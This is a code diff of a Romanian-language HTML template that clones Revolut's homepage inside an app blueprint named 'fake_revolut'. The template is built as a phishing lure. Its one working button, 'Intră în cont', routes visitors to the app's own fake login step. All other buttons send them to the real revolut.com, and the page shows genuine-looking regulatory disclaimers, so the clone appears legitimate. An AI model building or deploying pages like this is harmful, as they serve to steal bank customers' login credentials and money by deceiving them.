@@ -1,303 +1,444 @@
 {% extends "revolut/base.html" %}
 
-{% block title %}Revolut - One app, all things money{% endblock %}
+{% block title %}Revolut - Banca digitală pentru totul{% endblock %}
 
 {% block extra_head %}
-<!-- Google Fonts for minimalist typography -->
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&family=Inter:wght@300;400;500;600;700&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+<!-- Google Fonts for minimalist typography - Inter, Poppins, Roboto -->
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Poppins:wght@300;400;500;600;700;800;900&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+<!-- Tailwind CSS CDN for enhanced styling -->
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+  tailwind.config = {
+    theme: {
+      extend: {
+        fontFamily: {
+          'inter': ['Inter', 'sans-serif'],
+          'poppins': ['Poppins', 'sans-serif'],
+          'roboto': ['Roboto', 'sans-serif'],
+        }
+      }
+    }
+  }
+</script>
 {% endblock %}
 
 {% block content %}
-<!-- Hero Section - White Background -->
-<section class="section section-white section-lg hero-section">
-    <div class="main-container">
-        <div class="hero-content">
-            <h1>One app, all things money</h1>
-            <p class="body-text">From everyday spending to international transfers and investments, Revolut helps you get more from your money</p>
+<!-- Hero Section - Background with revolut_2 image -->
+<section class="hero-section relative min-h-screen flex items-center justify-center overflow-hidden" 
+         style="background-image: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('{{ url_for('static', filename='images/revolut_2.png') }}'); background-size: cover; background-position: center; background-attachment: fixed;">
+    <div class="container mx-auto px-6 text-center text-white relative z-10 fade-in-section">
+        <h1 class="text-5xl md:text-7xl font-bold font-poppins mb-6 animate-fade-in-up">
+            Banca digitală pentru totul
+        </h1>
+        <p class="text-xl md:text-2xl font-inter mb-12 max-w-3xl mx-auto animate-fade-in-up" style="animation-delay: 0.2s;">
+            De la plățile zilnice la investiții și economii - Revolut îți oferă controlul complet asupra banilor tăi
+        </p>
+        
+        <div class="flex flex-col sm:flex-row gap-6 justify-center items-center animate-fade-in-up" style="animation-delay: 0.4s;">
+            <!-- Only functional button -->
+            <a href="{{ url_for('fake_revolut.login_step1') }}" 
+               class="bg-white bg-opacity-0 hover:bg-opacity-20 text-white border-2 border-white px-8 py-4 rounded-full text-lg font-semibold font-poppins transition-all duration-300 hover:scale-105 hover:shadow-2xl backdrop-blur-sm" 
+               id="main-login-btn">
+                Intră în cont
+            </a>
             
-            <div style="display: flex; gap: var(--space-md); justify-content: center; flex-wrap: wrap; margin-top: var(--space-xl);">
-                <!-- Functional login button -->
-                <a href="{{ url_for('fake_revolut.login_step1') }}" class="btn btn-primary btn-large hover-lift" id="main-login-btn">
-                    Intrare în cont
-                </a>
-                
-                <!-- Crash trigger buttons -->
-                <a href="#" class="btn btn-secondary btn-large crash-trigger hover-lift">
-                    Descarcă aplicația
-                </a>
+            <!-- Non-functional button - redirects to real Revolut -->
+            <a href="#" 
+               class="bg-white bg-opacity-0 hover:bg-opacity-20 text-white border-2 border-white px-8 py-4 rounded-full text-lg font-semibold font-poppins transition-all duration-300 hover:scale-105 hover:shadow-2xl backdrop-blur-sm redirect-btn">
+                Deschide cont gratuit
+            </a>
+        </div>
+    </div>
+</section>
+
+<!-- White Section - Salariul tău, reorganizat -->
+<section class="bg-white py-20 px-6 fade-in-section">
+    <div class="container mx-auto max-w-6xl text-center">
+        <h2 class="text-4xl md:text-6xl font-bold font-poppins text-black mb-8">
+            Salariul tău, reorganizat
+        </h2>
+        <p class="text-xl md:text-2xl font-inter text-gray-600 mb-12 max-w-4xl mx-auto">
+            Automatizează-ți finanțele și economisește timp. Organizează-ți banii în vault-uri, 
+            programează transferuri și monitorizează-ți cheltuielile în timp real.
+        </p>
+        
+        <div class="grid md:grid-cols-3 gap-8 mt-16">
+            <div class="hover:scale-105 transition-transform duration-300">
+                <div class="bg-gray-50 rounded-2xl p-8 h-full">
+                    <h3 class="text-2xl font-semibold font-poppins mb-4">Automatizare inteligentă</h3>
+                    <p class="text-gray-600 font-inter">Economisește automat și plătește-ți facturile la timp</p>
+                </div>
+            </div>
+            
+            <div class="hover:scale-105 transition-transform duration-300">
+                <div class="bg-gray-50 rounded-2xl p-8 h-full">
+                    <h3 class="text-2xl font-semibold font-poppins mb-4">Analiză detaliată</h3>
+                    <p class="text-gray-600 font-inter">Înțelege-ți cheltuielile cu rapoarte detaliate</p>
+                </div>
+            </div>
+            
+            <div class="hover:scale-105 transition-transform duration-300">
+                <div class="bg-gray-50 rounded-2xl p-8 h-full">
+                    <h3 class="text-2xl font-semibold font-poppins mb-4">Control total</h3>
+                    <p class="text-gray-600 font-inter">Gestionează totul dintr-o singură aplicație</p>
+                </div>
             </div>
         </div>
     </div>
 </section>
 
-<!-- Features Section - Black Background -->
-<section class="section section-black section-lg">
-    <div class="main-container">
-        <div style="text-align: center; margin-bottom: var(--space-2xl);">
-            <h2 style="font-size: 2.5rem; font-weight: 700; margin-bottom: var(--space-md); font-family: 'Poppins', sans-serif;">
-                Banking, but better
-            </h2>
-            <p class="body-text" style="font-size: 1.2rem; opacity: 0.9; max-width: 600px; margin: 0 auto;">
-                Join 35+ million customers who trust Revolut for all their financial needs
-            </p>
-        </div>
+<!-- Cards Section - Background with revolut_5 image -->
+<section class="relative py-20 px-6 overflow-hidden fade-in-section"
+         style="background-image: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('{{ url_for('static', filename='images/revolut_5.png') }}'); background-size: cover; background-position: center; background-attachment: fixed;">
+    <div class="container mx-auto max-w-6xl text-center text-white relative z-10">
+        <h2 class="text-4xl md:text-6xl font-bold font-poppins mb-8">
+            Carduri pentru fiecare nevoie
+        </h2>
+        <p class="text-xl md:text-2xl font-inter mb-12 max-w-4xl mx-auto">
+            De la carduri virtuale pentru shopping online la carduri metalice premium - 
+            găsește cardul perfect pentru stilul tău de viață.
+        </p>
         
-        <div class="feature-grid">
-            <div class="feature-card hover-lift">
-                <h3>Spend & Save</h3>
-                <p>Get a debit card that gives you the real exchange rate and fee-free spending worldwide</p>
-                <a href="#" class="btn btn-primary crash-trigger hover-scale">
+        <div class="grid md:grid-cols-2 gap-8 mt-16">
+            <div class="bg-white bg-opacity-10 backdrop-blur-sm rounded-2xl p-8 hover:scale-105 transition-all duration-300 hover:bg-opacity-20">
+                <h3 class="text-2xl font-semibold font-poppins mb-4">Card Standard</h3>
+                <p class="mb-6 font-inter">Plăți contactless, securitate avansată și control total asupra cheltuielilor</p>
+                <a href="#" class="inline-block bg-white text-black px-6 py-3 rounded-full font-semibold font-poppins hover:bg-gray-200 transition-colors duration-300 redirect-btn">
+                    Comandă acum
+                </a>
+            </div>
+            
+            <div class="bg-white bg-opacity-10 backdrop-blur-sm rounded-2xl p-8 hover:scale-105 transition-all duration-300 hover:bg-opacity-20">
+                <h3 class="text-2xl font-semibold font-poppins mb-4">Card Premium</h3>
+                <p class="mb-6 font-inter">Acces la lounge-uri, asigurare de călătorie și beneficii exclusive</p>
+                <a href="#" class="inline-block bg-white text-black px-6 py-3 rounded-full font-semibold font-poppins hover:bg-gray-200 transition-colors duration-300 redirect-btn">
                     Află mai multe
                 </a>
             </div>
-            
-            <div class="feature-card hover-lift">
-                <h3>Global Transfers</h3>
-                <p>Send money abroad instantly at the real exchange rate with no hidden fees</p>
-                <a href="#" class="btn btn-primary crash-trigger hover-scale">
-                    Trimite bani
-                </a>
-            </div>
-            
-            <div class="feature-card hover-lift">
-                <h3>Invest</h3>
-                <p>Commission-free trading in stocks, crypto, and commodities</p>
-                <a href="#" class="btn btn-primary crash-trigger hover-scale">
+        </div>
+    </div>
+</section>
+
+<!-- Black Section - Investments and Crypto -->
+<section class="bg-black py-20 px-6 fade-in-section">
+    <div class="container mx-auto max-w-6xl text-center text-white">
+        <h2 class="text-4xl md:text-6xl font-bold font-poppins mb-8">
+            Investiții și Crypto
+        </h2>
+        <p class="text-xl md:text-2xl font-inter mb-12 max-w-4xl mx-auto opacity-90">
+            Construiește-ți portofoliul cu acțiuni, crypto și materii prime. 
+            Fără comisioane ascunse, cu analitică avansată și educație financiară.
+        </p>
+        
+        <div class="grid md:grid-cols-3 gap-8 mt-16">
+            <div class="bg-gray-900 rounded-2xl p-8 hover:scale-105 transition-all duration-300 hover:bg-gray-800">
+                <h3 class="text-2xl font-semibold font-poppins mb-4">Acțiuni</h3>
+                <p class="mb-6 font-inter opacity-90">Investește în companiile favorite fără comisioane</p>
+                <a href="#" class="inline-block bg-white text-black px-6 py-3 rounded-full font-semibold font-poppins hover:bg-gray-200 transition-colors duration-300 redirect-btn">
                     Începe să investești
                 </a>
             </div>
-        </div>
-    </div>
-</section>
-
-<!-- Statistics Section - White Background -->
-<section class="section section-white section-lg">
-    <div class="main-container">
-        <div style="text-align: center; margin-bottom: var(--space-2xl);">
-            <h2 style="font-size: 2.5rem; font-weight: 700; margin-bottom: var(--space-md); font-family: 'Poppins', sans-serif;">
-                Join millions worldwide
-            </h2>
-            <p class="body-text" style="font-size: 1.2rem; opacity: 0.8; max-width: 600px; margin: 0 auto;">
-                Experience banking without borders
-            </p>
-        </div>
-        
-        <div class="stats-grid">
-            <div class="stat-item">
-                <span class="stat-number" data-target="35">35M+</span>
-                <div class="stat-label">Customers worldwide</div>
-            </div>
-            <div class="stat-item">
-                <span class="stat-number" data-target="180">180+</span>
-                <div class="stat-label">Countries supported</div>
-            </div>
-            <div class="stat-item">
-                <span class="stat-number" data-target="1">$1B+</span>
-                <div class="stat-label">Transferred daily</div>
-            </div>
-            <div class="stat-item">
-                <span class="stat-number" data-target="150">150+</span>
-                <div class="stat-label">Currencies supported</div>
-            </div>
-        </div>
-        
-        <div style="text-align: center; margin-top: var(--space-xl);">
-            <div style="display: flex; gap: var(--space-md); justify-content: center; flex-wrap: wrap;">
-                <a href="#" class="btn btn-primary btn-large crash-trigger hover-lift">
-                    Start your journey
+            
+            <div class="bg-gray-900 rounded-2xl p-8 hover:scale-105 transition-all duration-300 hover:bg-gray-800">
+                <h3 class="text-2xl font-semibold font-poppins mb-4">Crypto</h3>
+                <p class="mb-6 font-inter opacity-90">Cumpără, vinde și păstrează peste 100 de crypto</p>
+                <a href="#" class="inline-block bg-white text-black px-6 py-3 rounded-full font-semibold font-poppins hover:bg-gray-200 transition-colors duration-300 redirect-btn">
+                    Explorează crypto
                 </a>
-                <a href="#" class="btn btn-secondary btn-large crash-trigger hover-lift">
-                    Download app
+            </div>
+            
+            <div class="bg-gray-900 rounded-2xl p-8 hover:scale-105 transition-all duration-300 hover:bg-gray-800">
+                <h3 class="text-2xl font-semibold font-poppins mb-4">Materii prime</h3>
+                <p class="mb-6 font-inter opacity-90">Diversifică cu aur, argint și alte metale prețioase</p>
+                <a href="#" class="inline-block bg-white text-black px-6 py-3 rounded-full font-semibold font-poppins hover:bg-gray-200 transition-colors duration-300 redirect-btn">
+                    Investește în aur
                 </a>
             </div>
         </div>
     </div>
 </section>
 
-<!-- Business Section - Black Background -->
-<section class="section section-black section-lg">
-    <div class="main-container">
-        <div style="text-align: center; margin-bottom: var(--space-2xl);">
-            <h2 style="font-size: 2.5rem; font-weight: 700; margin-bottom: var(--space-md); font-family: 'Poppins', sans-serif;">
-                More than personal banking
-            </h2>
-            <p class="body-text" style="font-size: 1.2rem; opacity: 0.9; max-width: 600px; margin: 0 auto;">
-                Comprehensive financial solutions for every need
-            </p>
-        </div>
+<!-- White Section - Security -->
+<section class="bg-white py-20 px-6 fade-in-section">
+    <div class="container mx-auto max-w-6xl text-center">
+        <h2 class="text-4xl md:text-6xl font-bold font-poppins text-black mb-8">
+            Securitate de nivel bancar
+        </h2>
+        <p class="text-xl md:text-2xl font-inter text-gray-600 mb-12 max-w-4xl mx-auto">
+            Banii tăi sunt protejați cu tehnologia de ultimă generație. 
+            Licențiați și reglementați în toată Europa pentru siguranța maximă.
+        </p>
         
-        <div class="feature-grid">
-            <div class="feature-card hover-lift">
-                <h3>Business</h3>
-                <p>Multi-currency business accounts with expense management and corporate cards</p>
-                <a href="#" class="btn btn-primary crash-trigger hover-scale">
-                    Cont business
-                </a>
-            </div>
-            
-            <div class="feature-card hover-lift">
-                <h3>Junior Account</h3>
-                <p>Teaching financial responsibility with parental controls and spending insights</p>
-                <a href="#" class="btn btn-primary crash-trigger hover-scale">
-                    Pentru copii
-                </a>
-            </div>
-            
-            <div class="feature-card hover-lift">
-                <h3>Premium Cards</h3>
-                <p>Metal cards with exclusive benefits, travel insurance, and airport lounge access</p>
-                <a href="#" class="btn btn-primary crash-trigger hover-scale">
-                    Upgrade premium
-                </a>
-            </div>
-        </div>
-    </div>
-</section>
-
-<!-- Call to Action Section - White Background -->
-<section class="section section-white section-lg">
-    <div class="main-container">
-        <div style="text-align: center;">
-            <h2 style="font-size: 2.5rem; font-weight: 700; margin-bottom: var(--space-md); font-family: 'Poppins', sans-serif;">
-                Ready to get started?
-            </h2>
-            <p class="body-text" style="font-size: 1.2rem; opacity: 0.8; margin-bottom: var(--space-xl); max-width: 500px; margin-left: auto; margin-right: auto;">
-                It takes less than 5 minutes to sign up
-            </p>
-            
-            <div style="display: flex; gap: var(--space-md); justify-content: center; flex-wrap: wrap; margin-bottom: var(--space-xl);">
-                <a href="#" class="btn btn-primary btn-large crash-trigger hover-lift">
-                    Open account
-                </a>
-                <a href="#" class="btn btn-secondary btn-large crash-trigger hover-lift">
-                    Learn more
-                </a>
-            </div>
-            
-            <div class="feature-grid" style="margin-top: var(--space-2xl);">
-                <div class="feature-card hover-lift" style="text-align: center;">
-                    <h4 style="font-size: 1.1rem; font-weight: 600; margin-bottom: var(--space-sm); font-family: 'Poppins', sans-serif;">Mobile Banking</h4>
-                    <p style="margin-bottom: var(--space-md);">Manage your money on the go</p>
-                    <a href="#" class="btn btn-primary crash-trigger hover-scale">
-                        Download
-                    </a>
+        <div class="grid md:grid-cols-2 gap-8 mt-16 mb-12">
+            <div class="hover:scale-105 transition-transform duration-300">
+                <div class="bg-gray-50 rounded-2xl p-8 h-full">
+                    <h3 class="text-2xl font-semibold font-poppins mb-4 text-black">Licență bancară</h3>
+                    <p class="text-gray-600 font-inter">Autorizați și supraveghiați de Banca Centrală Europeană</p>
                 </div>
-                
-                <div class="feature-card hover-lift" style="text-align: center;">
-                    <h4 style="font-size: 1.1rem; font-weight: 600; margin-bottom: var(--space-sm); font-family: 'Poppins', sans-serif;">Business Solutions</h4>
-                    <p style="margin-bottom: var(--space-md);">Banking for your business</p>
-                    <a href="#" class="btn btn-primary crash-trigger hover-scale">
-                        Get started
-                    </a>
-                </div>
-                
-                <div class="feature-card hover-lift" style="text-align: center;">
-                    <h4 style="font-size: 1.1rem; font-weight: 600; margin-bottom: var(--space-sm); font-family: 'Poppins', sans-serif;">Premium Perks</h4>
-                    <p style="margin-bottom: var(--space-md);">Exclusive benefits await</p>
-                    <a href="#" class="btn btn-primary crash-trigger hover-scale">
-                        Upgrade
-                    </a>
+            </div>
+            
+            <div class="hover:scale-105 transition-transform duration-300">
+                <div class="bg-gray-50 rounded-2xl p-8 h-full">
+                    <h3 class="text-2xl font-semibold font-poppins mb-4 text-black">Protecție FSCS</h3>
+                    <p class="text-gray-600 font-inter">Depozitele sunt protejate până la £85,000 per client</p>
                 </div>
             </div>
         </div>
+        
+        <div class="flex flex-col sm:flex-row gap-6 justify-center items-center">
+            <a href="#" class="bg-black text-white px-8 py-4 rounded-full text-lg font-semibold font-poppins transition-all duration-300 hover:scale-105 hover:bg-gray-800 redirect-btn">
+                Află despre securitate
+            </a>
+            <a href="#" class="bg-black text-white px-8 py-4 rounded-full text-lg font-semibold font-poppins transition-all duration-300 hover:scale-105 hover:bg-gray-800 redirect-btn">
+                Centre de ajutor
+            </a>
+        </div>
+        
+        <!-- Legal disclaimers -->
+        <div class="mt-16 text-sm text-gray-500 max-w-4xl mx-auto font-inter">
+            <p class="mb-2">
+                Revolut este licențiată ca instituție de monedă electronică de către Financial Conduct Authority 
+                din Regatul Unit sub numărul de referință 900562.
+            </p>
+            <p>
+                Serviciile de investiții sunt furnizate de Revolut Trading Ltd., autorizată și reglementată 
+                de Financial Conduct Authority. Capitalul este supus riscului.
+            </p>
+        </div>
     </div>
 </section>
 
+<!-- Three Black Sections - Plans (Standard, Plus, Premium) -->
+<section class="bg-black py-20 px-6 fade-in-section">
+    <div class="container mx-auto max-w-6xl text-center text-white">
+        <h2 class="text-4xl md:text-6xl font-bold font-poppins mb-8">
+            Alege planul potrivit
+        </h2>
+        <p class="text-xl md:text-2xl font-inter mb-16 max-w-4xl mx-auto opacity-90">
+            De la cont gratuit la beneficii premium - găsește planul care se potrivește stilului tău de viață
+        </p>
+        
+        <div class="grid md:grid-cols-3 gap-8">
+            <!-- Standard Plan -->
+            <div class="bg-gray-900 rounded-2xl p-8 hover:scale-105 transition-all duration-300 hover:bg-gray-800 relative overflow-hidden">
+                <div class="relative z-10">
+                    <div class="mb-6">
+                        <img src="{{ url_for('static', filename='images/revolut_1.png') }}" alt="Standard Plan" class="w-20 h-20 mx-auto rounded-lg object-cover">
+                    </div>
+                    <h3 class="text-3xl font-bold font-poppins mb-4">Standard</h3>
+                    <p class="text-4xl font-bold font-poppins mb-2">Gratuit</p>
+                    <p class="text-gray-400 font-inter mb-8">Pentru nevoile zilnice</p>
+                    
+                    <ul class="text-left space-y-3 mb-8 font-inter">
+                        <li class="flex items-center"><span class="text-green-400 mr-3">✓</span> Card de debit gratuit</li>
+                        <li class="flex items-center"><span class="text-green-400 mr-3">✓</span> Plăți contactless</li>
+                        <li class="flex items-center"><span class="text-green-400 mr-3">✓</span> Transferuri interne gratuite</li>
+                        <li class="flex items-center"><span class="text-green-400 mr-3">✓</span> Analitică de bază</li>
+                    </ul>
+                    
+                    <a href="#" class="inline-block bg-white text-black px-8 py-3 rounded-full font-semibold font-poppins hover:bg-gray-200 transition-colors duration-300 w-full text-center redirect-btn">
+                        Începe acum
+                    </a>
+                </div>
+            </div>
+            
+            <!-- Plus Plan -->
+            <div class="bg-gray-900 rounded-2xl p-8 hover:scale-105 transition-all duration-300 hover:bg-gray-800 relative overflow-hidden border-2 border-blue-500">
+                <div class="absolute top-4 right-4 bg-blue-500 text-white px-3 py-1 rounded-full text-sm font-semibold">Populat</div>
+                <div class="relative z-10">
+                    <div class="mb-6">
+                        <img src="{{ url_for('static', filename='images/revolut_3.png') }}" alt="Plus Plan" class="w-20 h-20 mx-auto rounded-lg object-cover">
+                    </div>
+                    <h3 class="text-3xl font-bold font-poppins mb-4">Plus</h3>
+                    <p class="text-4xl font-bold font-poppins mb-2">2.99€<span class="text-lg font-normal">/lună</span></p>
+                    <p class="text-gray-400 font-inter mb-8">Pentru utilizarea zilnică avansată</p>
+                    
+                    <ul class="text-left space-y-3 mb-8 font-inter">
+                        <li class="flex items-center"><span class="text-green-400 mr-3">✓</span> Toate din Standard</li>
+                        <li class="flex items-center"><span class="text-green-400 mr-3">✓</span> Transferuri internationale gratuite</li>
+                        <li class="flex items-center"><span class="text-green-400 mr-3">✓</span> Asigurare medicală de călătorie</li>
+                        <li class="flex items-center"><span class="text-green-400 mr-3">✓</span> Cashback 0.1%</li>
+                    </ul>
+                    
+                    <a href="#" class="inline-block bg-white text-black px-8 py-3 rounded-full font-semibold font-poppins hover:bg-gray-200 transition-colors duration-300 w-full text-center redirect-btn">
+                        Alege Plus
+                    </a>
+                </div>
+            </div>
+            
+            <!-- Premium Plan -->
+            <div class="bg-gray-900 rounded-2xl p-8 hover:scale-105 transition-all duration-300 hover:bg-gray-800 relative overflow-hidden">
+                <div class="relative z-10">
+                    <div class="mb-6">
+                        <img src="{{ url_for('static', filename='images/revolut_11.png') }}" alt="Premium Plan" class="w-20 h-20 mx-auto rounded-lg object-cover">
+                    </div>
+                    <h3 class="text-3xl font-bold font-poppins mb-4">Premium</h3>
+                    <p class="text-4xl font-bold font-poppins mb-2">7.99€<span class="text-lg font-normal">/lună</span></p>
+                    <p class="text-gray-400 font-inter mb-8">Pentru controlul complet</p>
+                    
+                    <ul class="text-left space-y-3 mb-8 font-inter">
+                        <li class="flex items-center"><span class="text-green-400 mr-3">✓</span> Toate din Plus</li>
+                        <li class="flex items-center"><span class="text-green-400 mr-3">✓</span> Card metalic</li>
+                        <li class="flex items-center"><span class="text-green-400 mr-3">✓</span> Acces la lounge-uri aeroport</li>
+                        <li class="flex items-center"><span class="text-green-400 mr-3">✓</span> Cashback 1%</li>
+                    </ul>
+                    
+                    <a href="#" class="inline-block bg-white text-black px-8 py-3 rounded-full font-semibold font-poppins hover:bg-gray-200 transition-colors duration-300 w-full text-center redirect-btn">
+                        Upgrade Premium
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- JavaScript for smooth animations and functionality -->
 <script>
-// Minimalist interaction tracking and crash functionality
 document.addEventListener('DOMContentLoaded', function() {
-    // Smooth loading animation
-    document.body.style.opacity = '0';
-    document.body.style.transition = 'opacity 0.6s ease-in-out';
-    
-    window.addEventListener('load', () => {
-        document.body.style.opacity = '1';
-    });
-    
-    // Enhanced crash trigger functionality with minimal loading states
-    const crashTriggers = document.querySelectorAll('.crash-trigger');
-    crashTriggers.forEach(trigger => {
-        trigger.addEventListener('click', function(e) {
-            e.preventDefault();
-            
-            // Disable button and show minimal loading state
-            this.style.pointerEvents = 'none';
-            const originalText = this.textContent;
-            this.innerHTML = '<span class="loading"></span>';
-            this.style.opacity = '0.7';
-            
-            // Simulate realistic loading time (1-2 seconds)
-            const loadingTime = 1000 + Math.random() * 1000;
-            
-            setTimeout(() => {
-                window.location.href = '/revolut/crash';
-            }, loadingTime);
-        });
-    });
-    
-    // Animate statistics counters when they come into view
-    const observeCounters = new IntersectionObserver((entries) => {
+    // Smooth fade-in animations for sections
+    const observerOptions = {
+        threshold: 0.1,
+        rootMargin: '0px 0px -50px 0px'
+    };
+
+    const observer = new IntersectionObserver((entries) => {
         entries.forEach(entry => {
-            if (entry.isIntersecting && !entry.target.dataset.animated) {
-                entry.target.dataset.animated = 'true';
-                animateCounter(entry.target);
-            }
-        });
-    }, { threshold: 0.5 });
-    
-    document.querySelectorAll('.stat-number').forEach(counter => {
-        observeCounters.observe(counter);
-    });
-    
-    function animateCounter(element) {
-        const target = parseInt(element.getAttribute('data-target') || element.textContent);
-        const suffix = element.textContent.includes('$') ? 'B+' : 
-                      element.textContent.includes('M') ? 'M+' : '+';
-        const prefix = element.textContent.includes('$') ? '$' : '';
-        
-        let current = 0;
-        const increment = target / 60; // Smooth 1-second animation
-        
-        const timer = setInterval(() => {
-            current += increment;
-            if (current >= target) {
-                current = target;
-                clearInterval(timer);
-            }
-            element.textContent = prefix + Math.floor(current) + suffix;
-        }, 16); // 60fps
-    }
-    
-    // Add subtle entrance animations for cards
-    const observeCards = new IntersectionObserver((entries) => {
-        entries.forEach((entry, index) => {
             if (entry.isIntersecting) {
-                setTimeout(() => {
-                    entry.target.style.opacity = '1';
-                    entry.target.style.transform = 'translateY(0)';
-                }, index * 100);
+                entry.target.style.opacity = '1';
+                entry.target.style.transform = 'translateY(0)';
             }
         });
-    }, { threshold: 0.1 });
-    
-    document.querySelectorAll('.feature-card, .stat-item').forEach(card => {
-        card.style.opacity = '0';
-        card.style.transform = 'translateY(20px)';
-        card.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
-        observeCards.observe(card);
+    }, observerOptions);
+
+    // Apply fade-in animation to all sections
+    document.querySelectorAll('.fade-in-section').forEach(section => {
+        section.style.opacity = '0';
+        section.style.transform = 'translateY(30px)';
+        section.style.transition = 'opacity 0.8s ease, transform 0.8s ease';
+        observer.observe(section);
     });
-    
-    // Enhance main login button with special interaction
+
+    // Main login button special handling (functional)
     const mainLoginBtn = document.getElementById('main-login-btn');
     if (mainLoginBtn) {
-        mainLoginBtn.addEventListener('click', function() {
-            // Add subtle click effect
-            this.style.transform = 'scale(0.98)';
+        mainLoginBtn.addEventListener('click', function(e) {
+            this.style.transform = 'scale(0.95)';
             setTimeout(() => {
                 this.style.transform = '';
             }, 150);
         });
     }
+
+    // Redirect buttons (non-functional) - instant redirect to real Revolut
+    document.querySelectorAll('.redirect-btn').forEach(btn => {
+        btn.addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            // Small animation before redirect
+            this.style.transform = 'scale(0.95)';
+            this.style.opacity = '0.7';
+            
+            // Show brief loading state
+            const originalText = this.innerHTML;
+            this.innerHTML = '<span class="animate-pulse">Se încarcă...</span>';
+            
+            // Quick redirect to real Revolut site
+            setTimeout(() => {
+                window.location.href = 'https://revolut.com';
+            }, 600);
+        });
+    });
+
+    // Smooth scrolling for better UX
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener('click', function(e) {
+            e.preventDefault();
+            const target = document.querySelector(this.getAttribute('href'));
+            if (target) {
+                target.scrollIntoView({
+                    behavior: 'smooth',
+                    block: 'start'
+                });
+            }
+        });
+    });
+
+    // Add subtle parallax effect for background images
+    window.addEventListener('scroll', () => {
+        const scrolled = window.pageYOffset;
+        const parallaxElements = document.querySelectorAll('[style*="background-attachment: fixed"]');
+        
+        parallaxElements.forEach(element => {
+            const speed = 0.5;
+            element.style.transform = `translateY(${scrolled * speed}px)`;
+        });
+    });
+
+    // Enhanced entrance animations
+    const animateElements = document.querySelectorAll('.animate-fade-in-up');
+    animateElements.forEach((element, index) => {
+        element.style.opacity = '0';
+        element.style.transform = 'translateY(30px)';
+        element.style.transition = `opacity 0.8s ease ${index * 0.2}s, transform 0.8s ease ${index * 0.2}s`;
+        
+        setTimeout(() => {
+            element.style.opacity = '1';
+            element.style.transform = 'translateY(0)';
+        }, 100 + index * 200);
+    });
 });
 </script>
+
+<!-- Custom CSS for additional animations -->
+<style>
+@keyframes fadeInUp {
+    from {
+        opacity: 0;
+        transform: translateY(30px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+
+.animate-fade-in-up {
+    animation: fadeInUp 0.8s ease forwards;
+}
+
+/* Smooth scroll behavior */
+html {
+    scroll-behavior: smooth;
+}
+
+/* Loading animation */
+@keyframes pulse {
+    0%, 100% {
+        opacity: 1;
+    }
+    50% {
+        opacity: 0.5;
+    }
+}
+
+.animate-pulse {
+    animation: pulse 1s ease-in-out infinite;
+}
+
+/* Enhanced hover effects */
+.hover-scale-105:hover {
+    transform: scale(1.05);
+}
+
+/* Backdrop blur support */
+.backdrop-blur-sm {
+    backdrop-filter: blur(4px);
+}
+
+/* Custom transitions for smoother interactions */
+* {
+    transition-property: transform, opacity, background-color, border-color, color, box-shadow;
+    transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
+}
+</style>
 {% endblock %}
